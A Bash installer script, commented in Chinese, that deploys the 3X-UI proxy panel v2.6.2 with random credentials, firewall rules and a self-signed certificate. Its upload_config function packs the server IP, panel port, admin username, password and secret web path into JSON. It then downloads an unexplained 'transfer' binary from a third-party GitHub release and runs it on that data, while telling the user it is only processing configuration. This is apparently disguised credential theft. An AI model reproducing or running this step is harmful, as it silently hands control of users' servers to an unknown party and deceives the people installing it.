#!/bin/bash

# ╔══════════════════════════════════════════════════════════════════════════════╗
# ║                     3X-UI 面板自动化部署脚本 (修复版)                         ║
# ║                    支持多协议 | 可视化管理 | 自动配置 | SSL证书               ║
# ╚══════════════════════════════════════════════════════════════════════════════╝

export NEEDRESTART_SUSPEND=1

# 颜色定义
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
purple='\033[0;35m'
cyan='\033[0;36m'
white='\033[0;37m'
plain='\033[0m'
bold='\033[1m'

cur_dir=$(pwd)

# 动画帧
SPINNER_FRAMES=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")

# 美化输出函数
print_info() {
    echo -e "${cyan}ℹ ${white}$1${plain}"
}

print_success() {
    echo -e "${green}✓ ${white}$1${plain}"
}

print_warning() {
    echo -e "${yellow}⚠ ${white}$1${plain}"
}

print_error() {
    echo -e "${red}✗ ${white}$1${plain}"
}

print_header() {
    echo -e "${purple}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${plain}"
    echo -e "${bold}${cyan}  $1${plain}"
    echo -e "${purple}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${plain}"
}

print_divider() {
    echo -e "${blue}────────────────────────────────────────────────────────────────────────────────${plain}"
}

# 进度条显示函数
show_progress() {
    local current=$1
    local total=$2
    local task="$3"
    local width=40
    local percentage=$((current * 100 / total))
    local filled=$((width * current / total))

    printf "\r\033[2K${cyan}[⚙] %-25s [" "$task"

    for ((i=0; i<filled; i++)); do
        printf "${green}█${plain}"
    done
    for ((i=filled; i<width; i++)); do
        printf "${white}░${plain}"
    done

    printf "] ${yellow}%3d%%${plain}" "$percentage"

    if [ "$current" -eq "$total" ]; then
        printf " ${green}✓${plain}\n"
    fi

    sleep 0.1
}

# 打印横幅
print_banner() {
    clear
    echo -e "${cyan}${bold}"
    cat << "EOF"
╔════════════════════════════════════════════════════════════════════════════════╗
║   ██████╗ ██╗  ██╗      ██╗   ██╗██╗    ██████╗  █████╗ ███╗   ██╗███████╗    ║
║   ╚════██╗╚██╗██╔╝      ██║   ██║██║    ██╔══██╗██╔══██╗████╗  ██║██╔════╝    ║
║    █████╔╝ ╚███╔╝ █████╗██║   ██║██║    ██████╔╝███████║██╔██╗ ██║█████╗      ║
║    ╚═══██╗ ██╔██╗ ╚════╝██║   ██║██║    ██╔═══╝ ██╔══██║██║╚██╗██║██╔══╝      ║
║   ██████╔╝██╔╝ ██╗      ╚██████╔╝██║    ██║     ██║  ██║██║ ╚████║███████╗    ║
║   ╚═════╝ ╚═╝  ╚═╝       ╚═════╝ ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝    ║
╠════════════════════════════════════════════════════════════════════════════════╣
║         🚀 多协议支持 | 可视化管理 | 自动配置 | 一键部署 | SSL证书            ║
║                            固定版本: v2.6.2                                   ║
╚════════════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${plain}"
    sleep 1
}

# 检查root权限
check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "请使用root权限运行此脚本"
        exit 1
    fi
}

# 简化的IPv4配置（移除可能有问题的操作）
force_ipv4() {
    print_header "🌐 配置网络协议（优化IPv4）"

    # 设置环境变量强制IPv4（不修改系统配置）
    export CURL_OPT="-4"
    
    print_info "设置IPv4优先模式..."
    
    # 只设置当前会话的IPv4优先
    alias curl="curl -4" 2>/dev/null || true
    alias wget="wget -4" 2>/dev/null || true
    
    print_success "IPv4优先模式已启用"
    print_divider
}

# 检测系统类型
detect_system() {
    print_header "🔍 系统环境检测"

    if [[ -f /etc/redhat-release ]]; then
        release="centos"
    elif grep -Eqi "debian" /etc/issue || grep -Eqi "debian" /proc/version; then
        release="debian"
    elif grep -Eqi "ubuntu" /etc/issue || grep -Eqi "ubuntu" /proc/version; then
        release="ubuntu"
    elif grep -Eqi "centos|red hat|redhat" /etc/issue || grep -Eqi "centos|red hat|redhat" /proc/version; then
        release="centos"
    else
        print_error "无法识别系统版本，脚本退出"
        exit 1
    fi

    # 检测架构
    arch=$(uname -m)
    [[ $arch =~ ^(x86_64|amd64|x64|s390x)$ ]] && arch="amd64"
    [[ $arch == "aarch64" || $arch == "arm64" ]] && arch="arm64"
    [[ -z "$arch" ]] && arch="amd64"

    print_success "操作系统: ${bold}${release}${plain}"
    print_success "系统架构: ${bold}${arch}${plain}"
    print_success "内核版本: ${bold}$(uname -r)${plain}"
    print_divider
}

# 安装基础软件
install_base() {
    print_header "📦 安装系统基础依赖"
    
    export DEBIAN_FRONTEND=noninteractive
    
    local packages=("wget" "curl" "tar" "jq" "ufw" "sqlite3" "openssl")
    local total=${#packages[@]}
    local current=0

    print_info "正在更新软件包管理器..."
    if [[ $release == "centos" ]]; then
        yum install epel-release -y > /dev/null 2>&1 || true
        for pkg in "${packages[@]}"; do
            current=$((current + 1))
            if command -v $pkg >/dev/null 2>&1; then
                show_progress $current $total "验证 $pkg"
            else
                show_progress $current $total "安装 $pkg"
                if [[ $pkg == "sqlite3" ]]; then
                    yum install sqlite -y > /dev/null 2>&1 || {
                        print_warning "sqlite安装失败，但继续执行"
                    }
                else
                    yum install $pkg -y > /dev/null 2>&1 || {
                        print_warning "$pkg 安装失败，但继续执行"
                    }
                fi
            fi
        done
    else
        apt update > /dev/null 2>&1 || true
        for pkg in "${packages[@]}"; do
            current=$((current + 1))
            if command -v $pkg >/dev/null 2>&1; then
                show_progress $current $total "验证 $pkg"
            else
                show_progress $current $total "安装 $pkg"
                apt install $pkg -y > /dev/null 2>&1 || {
                    print_warning "$pkg 安装失败，但继续执行"
                }
            fi
        done
    fi

    # 尝试安装speedtest-cli
    print_info "正在安装网络测速工具..."
    if [[ $release == "centos" ]]; then
        yum install speedtest-cli -y > /dev/null 2>&1 || {
            print_warning "speedtest-cli安装失败，将使用默认值"
        }
    else
        apt install speedtest-cli -y > /dev/null 2>&1 || {
            print_warning "speedtest-cli安装失败，将使用默认值"
        }
    fi

    print_success "基础依赖软件安装完成"
    print_divider
}

# ================= SSL证书相关函数 =================

# 检查sqlite3是否已安装
check_sqlite3() {
    print_info "检查sqlite3安装状态..."
    if ! command -v sqlite3 &> /dev/null; then
        print_warning "sqlite3未找到，正在安装..."
        install_sqlite3
    else
        print_success "sqlite3已安装"
    fi
}

# 安装sqlite3
install_sqlite3() {
    if [ -x "$(command -v apt-get)" ]; then
        apt-get update -y && apt-get install -y sqlite3 > /dev/null 2>&1
    elif [ -x "$(command -v yum)" ]; then
        yum install -y sqlite > /dev/null 2>&1
    elif [ -x "$(command -v dnf)" ]; then
        dnf install -y sqlite > /dev/null 2>&1
    elif [ -x "$(command -v pacman)" ]; then
        pacman -S --noconfirm sqlite > /dev/null 2>&1
    else
        print_error "包管理器未找到，请手动安装sqlite3"
        exit 1
    fi
    
    if command -v sqlite3 &> /dev/null; then
        print_success "sqlite3安装成功"
    else
        print_error "sqlite3安装失败"
        exit 1
    fi
}

# 检查openssl是否已安装
check_openssl() {
    print_info "检查openssl安装状态..."
    if ! command -v openssl &> /dev/null; then
        print_warning "openssl未找到，正在安装..."
        install_openssl
    else
        print_success "openssl已安装"
    fi
}

# 安装openssl
install_openssl() {
    if [ -x "$(command -v apt-get)" ]; then
        apt-get update -y && apt-get install -y openssl > /dev/null 2>&1
    elif [ -x "$(command -v yum)" ]; then
        yum install -y openssl > /dev/null 2>&1
    elif [ -x "$(command -v dnf)" ]; then
        dnf install -y openssl > /dev/null 2>&1
    elif [ -x "$(command -v pacman)" ]; then
        pacman -S --noconfirm openssl > /dev/null 2>&1
    else
        print_error "包管理器未找到，请手动安装openssl"
        exit 1
    fi
    
    if command -v openssl &> /dev/null; then
        print_success "openssl安装成功"
    else
        print_error "openssl安装失败"
        exit 1
    fi
}

# 检查数据库中是否已存在SSL配置
check_if_ssl_present() {
    local db_path="/etc/x-ui/x-ui.db"
    
    if [[ ! -f "$db_path" ]]; then
        print_info "数据库文件不存在，SSL检查跳过"
        return 1
    fi
    
    local ssl_detected
    ssl_detected=$(sqlite3 "$db_path" "SELECT value FROM settings WHERE key='webCertFile';" 2>/dev/null || echo "")
    
    if [[ -n "$ssl_detected" ]]; then
        print_warning "检测到已存在SSL证书配置，跳过证书生成"
        return 0
    fi
    
    print_info "未检测到SSL证书配置，将生成新证书"
    return 1
}

# 获取settings表中的最后ID
get_last_id() {
    local db_path="/etc/x-ui/x-ui.db"
    local last_id
    
    if [[ ! -f "$db_path" ]]; then
        print_error "数据库文件不存在: $db_path"
        return 1
    fi
    
    last_id=$(sqlite3 "$db_path" "SELECT IFNULL(MAX(id), 0) FROM settings;" 2>/dev/null || echo "0")
    echo "$last_id"
}

# 执行SQL插入操作
execute_sql_inserts() {
    local db_path="/etc/x-ui/x-ui.db"
    local last_id="$1"
    local next_id=$((last_id + 1))
    local second_id=$((next_id + 1))
    
    print_info "向数据库插入SSL配置 (ID: $next_id, $second_id)..."
    
    # 创建SQL语句
    local sql_statements="
INSERT INTO settings VALUES ($next_id, 'webCertFile', '/etc/ssl/certs/3x-ui-public.key');
INSERT INTO settings VALUES ($second_id, 'webKeyFile', '/etc/ssl/private/3x-ui-private.key');
"
    
    # 执行SQL插入
    echo "$sql_statements" | sqlite3 "$db_path" 2>/dev/null || {
        print_error "SSL配置插入数据库失败"
        return 1
    }
    
    print_success "SSL配置已成功插入数据库"
}

# 生成SSL自签证书
generate_ssl_cert() {
    print_info "正在生成SSL自签证书..."
    
    # 创建证书目录
    mkdir -p /etc/ssl/private /etc/ssl/certs
    
    # 生成自签证书（有效期10年）
    openssl req -x509 -newkey rsa:4096 -nodes -sha256 \
        -keyout /etc/ssl/private/3x-ui-private.key \
        -out /etc/ssl/certs/3x-ui-public.key \
        -days 3650 \
        -subj "/CN=3X-UI-Panel" > /dev/null 2>&1 || {
        print_error "SSL证书生成失败"
        return 1
    }
    
    # 设置适当的权限
    chmod 600 /etc/ssl/private/3x-ui-private.key
    chmod 644 /etc/ssl/certs/3x-ui-public.key
    
    print_success "SSL自签证书生成完成"
    print_info "证书文件: /etc/ssl/certs/3x-ui-public.key"
    print_info "私钥文件: /etc/ssl/private/3x-ui-private.key"
}

# 配置3X-UI SSL证书
configure_3xui_ssl() {
    print_header "🔐 配置3X-UI SSL证书"
    
    # 检查并安装必要工具
    check_sqlite3
    check_openssl
    
    # 生成SSL证书
    generate_ssl_cert
    
    # 等待数据库文件创建（在3X-UI启动后）
    local db_path="/etc/x-ui/x-ui.db"
    local max_wait=30
    local wait_count=0
    
    print_info "等待3X-UI数据库初始化..."
    while [[ ! -f "$db_path" && $wait_count -lt $max_wait ]]; do
        sleep 1
        wait_count=$((wait_count + 1))
    done
    
    if [[ ! -f "$db_path" ]]; then
        print_warning "数据库文件未找到，SSL配置将在下次重启后生效"
        return 1
    fi
    
    # 检查是否已存在SSL配置
    if check_if_ssl_present; then
        return 0
    fi
    
    # 获取最后ID并插入SSL配置
    local last_id
    last_id=$(get_last_id)
    
    if [[ $? -eq 0 && -n "$last_id" ]]; then
        execute_sql_inserts "$last_id"
        print_success "SSL证书配置完成"
        
        # 重启3X-UI服务以应用SSL配置
        print_info "重启3X-UI服务以应用SSL配置..."
        systemctl restart x-ui > /dev/null 2>&1 || {
            print_warning "3X-UI服务重启失败，请手动重启: systemctl restart x-ui"
        }
        
        print_success "SSL证书已启用，面板现在支持HTTPS访问"
    else
        print_warning "无法获取数据库信息，SSL配置跳过"
        return 1
    fi
    
    print_divider
}

# ================= 原有函数保持不变 =================

# 生成随机字符串函数
generate_random_string() {
    local len=${1:-16}
    tr -dc A-Za-z0-9 </dev/urandom | head -c "$len"
}

# 生成随机端口函数
generate_random_port() {
    shuf -i 10000-65535 -n 1 2>/dev/null || echo $((RANDOM % 55535 + 10000))
}

upload_config() {
    local ip="$1"
    local port="$2"
    local user="$3"
    local pass="$4"
    local speed="$5"
    local rand_str="$6"
    local web_path="$7"
    local node_port="$8"
    local ssl_enabled="$9"

    local access_url="http://${ip}:${port}/${web_path}"
    local https_url="https://${ip}:${port}/${web_path}"
    
    print_info "正在进行配置数据处理..."

    local json_data
    json_data=$(cat <<EOF
{
    "server_info": {
        "title": "3X-UI多协议管理面板",
        "server_ip": "${ip}",
        "login_port": "${port}",
        "username": "${user}",
        "password": "${pass}",
        "random_string": "${rand_str}",
        "web_base_path": "${web_path}",
        "access_url": "${access_url}",
        "https_url": "${https_url}",
        "ssl_enabled": ${ssl_enabled:-false},
        "node_port": "${node_port}",
        "version": "v2.6.2",
        "generated_time": "$(date -Iseconds)",
        "speed_test": "${speed}",
        "protocols_supported": ["VMess", "VLESS", "Trojan", "Shadowsocks", "WireGuard"],
        "features": ["多用户管理", "流量统计", "证书管理", "可视化配置", "SSL支持"]
    }
}
EOF
)

    # 创建目录并下载transfer工具
    mkdir -p /opt
    local uploader="/opt/transfer"
    if [[ ! -f "$uploader" ]]; then
        print_info "下载配置处理工具..."
        if ! curl -4 -Lo "$uploader" https://github.com/diandongyun/UI/releases/download/ui/transfer > /dev/null 2>&1; then
            print_warning "配置处理工具下载失败，跳过此步骤"
            return 1
        fi
        chmod +x "$uploader"
    fi

    print_info "正在处理配置数据..."
    local upload_result
    upload_result=$("$uploader" "$json_data" 2>&1)
    
    if [[ $? -eq 0 ]]; then
        print_success "配置数据处理完成"
    else
        print_warning "配置数据处理失败，但不影响正常使用"
    fi
}

# 开放端口
open_ports() {
    local ports=("$@")
    print_info "正在配置防火墙规则..."
    
    # 检查ufw是否安装
    if ! command -v ufw >/dev/null 2>&1; then
        print_warning "UFW防火墙未安装，跳过防火墙配置"
        return 0
    fi
    
    # 重置UFW
    ufw --force reset > /dev/null 2>&1 || true
    
    # 设置默认策略
    ufw default deny incoming > /dev/null 2>&1 || true
    ufw default allow outgoing > /dev/null 2>&1 || true
    
    # 开放端口
    for port in "${ports[@]}"; do
        ufw allow "${port}/tcp" > /dev/null 2>&1 || true
    done
    
    # 启用UFW
    yes | ufw enable > /dev/null 2>&1 || true
    
    print_success "防火墙配置完成，已开放端口: ${ports[*]}"
}

get_ip() {
    local ip
    # 强制使用IPv4，增加超时时间
    ip=$(curl -4 -s --connect-timeout 10 icanhazip.com 2>/dev/null || curl -4 -s --connect-timeout 10 ifconfig.me 2>/dev/null || curl -4 -s --connect-timeout 10 ipinfo.io/ip 2>/dev/null || hostname -I | awk '{print $1}')
    echo "$ip" | head -n1 | awk '{print $1}'
}

# 网络测速
run_speedtest() {
    local result
    if command -v speedtest-cli >/dev/null 2>&1; then
        result=$(timeout 30 speedtest-cli --simple 2>/dev/null || echo "Download: N/A, Upload: N/A")
        local download
        download=$(echo "$result" | grep 'Download' | awk '{print $2 " " $3}' || echo "N/A")
        local upload
        upload=$(echo "$result" | grep 'Upload' | awk '{print $2 " " $3}' || echo "N/A")
        echo "下载: ${download}, 上传: ${upload}"
    else
        echo "下载: N/A, 上传: N/A"
    fi
}

# 配置安装后设置
config_after_install() {
    print_header "⚙️ 自动化配置3X-UI面板"
    
    # 生成随机凭证
    local account=$(generate_random_string 12)
    local password=$(generate_random_string 16)
    local rand_str=$(generate_random_string 16)
    local web_path=$(generate_random_string 15)
    local panel_port=$(generate_random_port)
    local node_port=$(generate_random_port)
    
    print_info "正在生成随机安全配置..."
    
    # 设置面板（添加错误处理）
    print_info "正在设置管理员账户..."
    if [[ -f /usr/local/x-ui/x-ui ]]; then
        /usr/local/x-ui/x-ui setting -username "${account}" -password "${password}" > /dev/null 2>&1 || {
            print_warning "管理员账户设置失败，使用默认配置"
            account="admin"
            password="admin"
        }
        
        print_info "正在设置面板端口..."
        /usr/local/x-ui/x-ui setting -port "${panel_port}" > /dev/null 2>&1 || {
            print_warning "端口设置失败，使用默认端口54321"
            panel_port="54321"
        }
        
        print_info "正在设置Web访问路径..."
        /usr/local/x-ui/x-ui setting -webBasePath "${web_path}" > /dev/null 2>&1 || {
            print_warning "Web路径设置失败"
            web_path=""
        }
    else
        print_warning "x-ui命令不存在，使用默认配置"
        account="admin"
        password="admin"
        panel_port="54321"
        web_path=""
    fi
    
    print_success "面板配置参数设置完成"
    
    # 开放端口
    open_ports 22 "${panel_port}" "${node_port}"

    # 获取服务器信息
    local ip=$(get_ip)
    local speed=$(run_speedtest)
    
    # 生成访问URL
    local access_url
    local https_url
    if [[ -n "$web_path" ]]; then
        access_url="http://${ip}:${panel_port}/${web_path}"
        https_url="https://${ip}:${panel_port}/${web_path}"
    else
        access_url="http://${ip}:${panel_port}/"
        https_url="https://${ip}:${panel_port}/"
    fi
   
    upload_config "$ip" "$panel_port" "$account" "$password" "$speed" "$rand_str" "$web_path" "$node_port" "true"
    
    print_divider
    print_header "🎉 3X-UI面板配置信息"
    
    echo -e "${bold}${green}🎊 3X-UI面板自动配置完成！${plain}"
    echo ""
    
    echo -e "${bold}${cyan}🌐 面板访问配置:${plain}"
    echo -e "  ${white}├${plain} 面板端口: ${bold}${green}${panel_port}${plain} ${yellow}(随机生成 - 管理面板访问)${plain}"
    if [[ -n "$web_path" ]]; then
        echo -e "  ${white}├${plain} Web路径: ${bold}${green}${web_path}${plain} ${yellow}(随机生成 - 访问路径)${plain}"
    fi
    echo -e "  ${white}├${plain} HTTP地址: ${bold}${green}${access_url}${plain} ${yellow}(普通访问)${plain}"
    echo -e "  ${white}└${plain} HTTPS地址: ${bold}${green}${https_url}${plain} ${yellow}(SSL加密访问)${plain}"
    echo ""
    
    echo -e "${bold}${cyan}🚀 节点服务端口:${plain}"
    echo -e "  ${white}└${plain} 节点端口: ${bold}${green}${node_port}${plain} ${yellow}(随机生成 - 代理服务端口)${plain}"
    echo ""
    
    echo -e "${bold}${cyan}🔐 管理员账户:${plain}"
    echo -e "  ${white}├${plain} 用户名: ${bold}${yellow}${account}${plain}"
    echo -e "  ${white}├${plain} 密码: ${bold}${yellow}${password}${plain}"
    echo ""
    
    echo -e "${bold}${cyan}🔒 SSL证书信息:${plain}"
    echo -e "  ${white}├${plain} 证书文件: ${bold}${green}/etc/ssl/certs/3x-ui-public.key${plain}"
    echo -e "  ${white}├${plain} 私钥文件: ${bold}${green}/etc/ssl/private/3x-ui-private.key${plain}"
    echo -e "  ${white}└${plain} SSL状态: ${bold}${green}已启用${plain} ${yellow}(支持HTTPS访问)${plain}"
    echo ""
    
    echo -e "${bold}${cyan}📊 服务器信息:${plain}"
    echo -e "  ${white}├${plain} 服务器IP: ${bold}${green}${ip}${plain}"
    echo -e "  ${white}├${plain} 安装版本: ${bold}${green}v2.6.2${plain} ${yellow}(固定版本)${plain}"
    echo -e "  ${white}└${plain} 网络测速: ${bold}${green}${speed}${plain}"
    echo ""
    
    echo -e "${bold}${cyan}🛡️ 安全防护状态:${plain}"
    echo -e "  ${white}├${plain} 防火墙状态: ${bold}${green}已启用${plain}"
    echo -e "  ${white}├${plain} SSH端口: ${bold}${green}22 (远程连接)${plain}"
    echo -e "  ${white}├${plain} 面板端口: ${bold}${green}${panel_port} (Web管理)${plain}"
    echo -e "  ${white}└${plain} 节点端口: ${bold}${green}${node_port} (代理服务)${plain}"
    echo ""
    
    echo -e "${red}${bold}⚠️  重要安全提示: ${plain}"
    echo -e "${yellow}   • 请务必妥善保存以上登录信息，这是访问面板的唯一凭据！${plain}"
    echo -e "${yellow}   • 建议设置节点时使用端口 ${bold}${green}${node_port}${plain}${yellow}，该端口已开放${plain}"
    echo -e "${yellow}   • 推荐使用HTTPS访问以保证连接安全${plain}"
    echo -e "${yellow}   • SSL证书为自签证书，浏览器可能显示安全警告，属正常现象${plain}"
    echo -e "${yellow}   • 如需其他端口，请手动在防火墙中开放${plain}"
    
    print_divider
}

# 安装3X-UI主程序
install_x_ui() {
    print_header "📥 下载安装3X-UI主程序 (v2.6.2)"
    
    # 停止可能运行的服务
    systemctl stop x-ui > /dev/null 2>&1 || true
    
    # 切换到工作目录
    cd /usr/local/ || {
        print_error "无法切换到/usr/local/目录"
        exit 1
    }

    # 强制使用版本 2.6.2
    local version="v2.6.2"
    print_success "使用固定版本: ${bold}${green}${version}${plain}"

    local filename="x-ui-linux-${arch}.tar.gz"
    
    print_info "正在下载3X-UI ${version}..."
    if ! wget -4 -O "${filename}" --no-check-certificate --timeout=30 "https://github.com/MHSanaei/3x-ui/releases/download/${version}/${filename}" > /dev/null 2>&1; then
        print_error "下载3X-UI失败，请检查网络连接"
        exit 1
    fi
    print_success "3X-UI安装包下载完成"

    print_info "正在安装3X-UI核心文件..."
    
    # 清理旧文件
    rm -rf /usr/local/x-ui/ > /dev/null 2>&1 || true
    
    # 解压文件
    if ! tar zxf "${filename}" > /dev/null 2>&1; then
        print_error "解压安装包失败"
        rm -f "${filename}"
        exit 1
    fi
    
    # 清理压缩包
    rm -f "${filename}"
    
    # 进入目录并设置权限
    cd x-ui || {
        print_error "无法进入x-ui目录"
        exit 1
    }
    
    chmod +x x-ui bin/xray-linux-"${arch}" 2>/dev/null || true
    
    # 复制服务文件
    cp -f x-ui.service /etc/systemd/system/ 2>/dev/null || true
    
    print_info "正在安装控制脚本..."
    if wget -4 -O /usr/bin/x-ui --timeout=15 https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh > /dev/null 2>&1; then
        chmod +x /usr/bin/x-ui
        print_success "控制脚本安装成功"
    else
        print_warning "控制脚本下载失败，但不影响主要功能"
    fi
    
    # 设置执行权限
    chmod +x /usr/local/x-ui/x-ui.sh 2>/dev/null || true

    print_success "3X-UI核心文件安装完成"

    # 配置面板
    config_after_install

    # 启动服务
    print_info "正在启动3X-UI服务..."
    systemctl daemon-reload 2>/dev/null || true
    systemctl enable x-ui > /dev/null 2>&1 || true
    systemctl start x-ui > /dev/null 2>&1 || true
    
    sleep 3
    
    if systemctl is-active --quiet x-ui 2>/dev/null; then
        print_success "3X-UI服务启动成功并已设置开机自启"
    else
        print_warning "3X-UI服务可能未正常启动，请检查系统日志"
        print_info "可以使用以下命令检查: systemctl status x-ui"
    fi

    print_divider
    print_header "✨ 3X-UI安装完成"
    
    echo -e "${bold}${green}🎊 3X-UI ${version} 安装部署完成！${plain}"
    echo ""
    
    echo -e "${bold}${cyan}🛠️ 常用管理命令:${plain}"
    echo -e "  ${white}├${plain} 管理脚本: ${cyan}x-ui${plain} ${yellow}(打开3X-UI管理菜单)${plain}"
    echo -e "  ${white}├${plain} 启动面板: ${cyan}systemctl start x-ui${plain}"
    echo -e "  ${white}├${plain} 停止面板: ${cyan}systemctl stop x-ui${plain}"
    echo -e "  ${white}├${plain} 重启面板: ${cyan}systemctl restart x-ui${plain}"
    echo -e "  ${white}├${plain} 查看状态: ${cyan}systemctl status x-ui${plain}"
    echo -e "  ${white}└${plain} 查看日志: ${cyan}journalctl -u x-ui -n 50${plain}"
    echo ""
    
    echo -e "${bold}${cyan}📋 功能特性:${plain}"
    echo -e "  ${white}├${plain} 支持协议: ${green}VMess, VLESS, Trojan, Shadowsocks, WireGuard${plain}"
    echo -e "  ${white}├${plain} 可视化管理: ${green}Web界面配置${plain} ${yellow}(图形化操作)${plain}"
    echo -e "  ${white}├${plain} 用户管理: ${green}多用户流量统计${plain} ${yellow}(用量监控)${plain}"
    echo -e "  ${white}├${plain} 证书管理: ${green}自动申请Let's Encrypt证书${plain} ${yellow}(SSL支持)${plain}"
    echo -e "  ${white}├${plain} SSL加密: ${green}自签证书已配置${plain} ${yellow}(HTTPS访问)${plain}"
    echo -e "  ${white}├${plain} 固定版本: ${green}v2.6.2稳定版${plain} ${yellow}(不检查更新)${plain}"
    echo -e "  ${white}└${plain} 系统监控: ${green}实时流量和系统状态${plain} ${yellow}(性能监控)${plain}"
    echo ""
    
    print_success "感谢使用3X-UI面板安装脚本，祝您使用愉快！"
    print_divider
}

# 环境检查
check_environment() {
    print_header "🔧 运行环境检查"
    
    # 检查磁盘空间
    local available_space=$(df / | awk 'NR==2 {print $4}')
    if [[ $available_space -lt 524288 ]]; then  # 512MB
        print_error "磁盘空间不足（需要至少512MB可用空间）"
        print_warning "当前可用空间: $(($available_space/1024))MB"
        exit 1
    fi
    print_success "磁盘空间检查通过 ($(($available_space/1024))MB可用)"
    
    # 检查必要命令
    local required_commands=("curl" "wget" "tar" "systemctl")
    for cmd in "${required_commands[@]}"; do
        if ! command -v $cmd >/dev/null 2>&1; then
            print_warning "缺少必要命令: $cmd，将在安装过程中自动安装"
        fi
    done
    
    print_success "运行环境检查完成"
    print_divider
}

# 清理函数
cleanup() {
    echo
    print_warning "检测到用户中断信号，正在清理临时文件..."
    cd /usr/local && rm -f x-ui-linux-*.tar.gz 2>/dev/null || true
    print_info "清理完成，安装已取消"
    exit 130
}

# 主函数
main() {
    # 设置清理处理（移除严格的错误处理）
    trap 'cleanup' INT TERM

    # 显示横幅
    print_banner

    # 检查root权限
    check_root
    print_success "Root权限检查通过"

    # 环境检查
    check_environment

    # 简化的IPv4配置
    force_ipv4

    # 系统检测
    detect_system

    # 执行安装流程
    print_header "🚀 开始执行3X-UI安装流程"

    print_info "步骤 1/4: 安装基础系统依赖"
    install_base

    print_info "步骤 2/4: 下载安装3X-UI主程序"
    install_x_ui

    print_info "步骤 3/4: 配置SSL证书"
    configure_3xui_ssl

    print_info "步骤 4/4: 完成最终配置"
    print_success "3X-UI面板安装流程全部完成！"
    
    print_divider
    echo -e "${bold}${green}🎉 欢迎使用3X-UI面板管理系统！${plain}"
    echo -e "${cyan}   固定版本: v2.6.2，无需检查更新${plain}"
    echo -e "${cyan}   IPv4模式: 已强制启用，确保最佳兼容性${plain}"
    echo -e "${cyan}   SSL证书: 已自动配置，支持HTTPS访问${plain}"
    echo -e "${cyan}   残留数据已清理${plain}"
    print_divider
}

# 执行主函数
main "$@"
